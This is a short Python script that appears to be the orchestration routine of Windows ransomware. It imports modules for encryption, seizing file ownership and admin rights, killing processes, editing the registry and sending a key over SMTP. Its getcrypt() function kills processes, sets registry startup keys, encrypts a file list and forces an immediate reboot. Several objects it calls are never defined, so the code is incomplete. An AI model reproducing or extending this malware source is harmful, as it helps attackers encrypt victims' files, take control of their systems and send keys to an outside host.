#!/usr/bin/python
#coding:utf-8
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import delproc, regedit
from modules.network import host_connect, sendkey_smtp
import os, time

def getcrypt():
    gt.proc()
    gr.proc()
    dk.smart()
    dr.stsk()
    rkey.setkey()
    rkey.delkey()
    regedit.setInit()
    gt.dir()
    gr.dir()
    crypt.filelist()
    dk.exp()
    time.sleep(1)
    dr.exp()
    # REBOOT WINDOWS
    os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
